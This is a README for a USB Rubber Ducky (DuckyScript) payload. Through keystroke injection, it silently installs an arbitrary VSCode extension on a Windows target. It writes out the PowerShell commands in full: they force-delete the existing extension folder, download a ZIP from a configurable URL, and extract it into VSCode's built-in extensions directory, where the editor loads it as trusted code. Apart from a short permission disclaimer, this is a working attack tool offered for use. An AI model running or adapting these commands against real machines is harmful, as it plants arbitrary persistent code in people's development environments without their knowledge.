# Install Any Arbitrary VSCode Extension

This DuckyScript script is designed to automate the installation of any arbitrary Visual Studio Code (VSCode) extension on Windows 10. It performs the following tasks:

1. Removes any pre-existing version of the extension (if applicable).
2. Downloads a ZIP archive of a VSCode extension.
3. Extracts the extension to the correct VSCode extensions folder.

The script makes use of PowerShell to manage file paths and execute commands necessary for the installation process. The user must provide the name of the extension folder and the link to the ZIP archive containing the extension.

## First Of All!

Installing Arbotrary Visual Studio Code (VSCode) extensions can pose cybersecurity risks because extensions, often developed by third parties, have access to critical functionalities of the editor and the operating system. A malicious extension could execute harmful code, access local files, or exfiltrate sensitive data without the user's knowledge. Additionally, if extensions are not from trusted sources or are not regularly updated, they may contain vulnerabilities that attackers can exploit, compromising the security of both the system and the entire development environment.

So...
- Before doing these tests make sure you have full permission from the owner of the computer in case it is not you.
- Always check the source and source code before doing this
- If even one line of code is not clear to you, you should not proceed at all because it takes only a little to do damage.

## Features

- Detects Windows passively through [PASSIVE_WINDOWS_DETECT](https://github.com/hak5/usbrubberducky-payloads/blob/master/payloads/extensions/passive_windows_detect.txt) by Hak5.
- Installs a VSCode extension by downloading a ZIP file and extracting it to the correct location.
- Removes any previous version of the extension.
- Completely automated, requiring no manual intervention once the script is executed.

## Requirements

- **Target OS**: Windows 10/11
- **VSCode Path**: The script assumes that VSCode is installed in its default location. If it is installed in a different location, the paths in the script may need to be updated.
- **Compilation**: Make sure that the extension you are going to install has the out folder inside, that is, the folder that is generated as a result of compilation. Without this folder the extension cannot be loaded properly.
- **Internet Connection**: This is mandatory in case you want to download the archive from the Internet, whereas if you want to download from a server in the intranet you only need to be connected to the local network. This basically depends on the individual case....

## Usage

### DuckyScript Configuration

Before running the script, make sure to configure the following two variables in the script:

1. `#EXTENSION_NAME`: Replace this with the name of the folder where the extension will be installed.
    ```plaintext
    DEFINE #EXTENSION_NAME example
    ```
   Example: If the extension folder name is `DuckyScriptCookbook`, then replace `example` with `DuckyScriptCookbook`.

2. `#ARCHIVE_LINK`: Replace this with the actual URL to the ZIP file of the VSCode extension you want to install.
    ```plaintext
    DEFINE #ARCHIVE_LINK https://example.com/path/to/archive.zip
    ```

### PowerShell Commands Breakdown

- **Detecting and Removing Previous Extension**: The script checks if an official version of the extension is already installed and removes it:
    ```powershell
    $extensionsPath = "$env:USERPROFILE\AppData\Local\Programs\Microsoft VS Code\resources\app\extensions\#EXTENSION_NAME"
    if (Test-Path -Path $extensionsPath -PathType Container) {
        Remove-Item -Recurse -Force -Path $extensionsPath
    }
    ```

- **Downloading and Extracting the New Extension**: The script downloads the extension from the link provided inside a temporary folder and extracts it inside the official (the default) VSCode extensions folder:
    ```powershell
    $url = "#ARCHIVE_LINK"
    $downloadPath = "$env:TEMP\#EXTENSION_NAME.zip"
    $extractPath = "$env:USERPROFILE\AppData\Local\Programs\Microsoft VS Code\resources\app\extensions\#EXTENSION_NAME"
    Invoke-WebRequest -Uri $url -OutFile $downloadPath
    if (Test-Path -Path $downloadPath) {
        Expand-Archive -Path $downloadPath -DestinationPath $extractPath -Force
        Remove-Item -Path $downloadPath -Force
    }
    ```
  
## Notes
- Ensure that the ZIP file is structured properly (i.e., it contains all necessary files for the extension) before attempting to install.
- Make sure that PowerShell is available on the target machine.
- This script is intended for Windows 10/11 systems. Compatibility with other versions of Windows has not been tested.

## Credits

<h2 align="center"> Aleff :octocat: </h2>
<div align=center>
<table>
  <tr>
    <td align="center" width="96">
      <a href="https://github.com/aleff-github">
        <img src=https://github.com/aleff-github/aleff-github/blob/main/img/github.png?raw=true width="48" height="48" />
      </a>
      <br>Github
    </td>
    <td align="center" width="96">
      <a href="https://www.linkedin.com/in/alessandro-greco-aka-aleff/">
        <img src=https://github.com/aleff-github/aleff-github/blob/main/img/linkedin.png?raw=true width="48" height="48" />
      </a>
      <br>Linkedin
    </td>
  </tr>
</table>
</div>
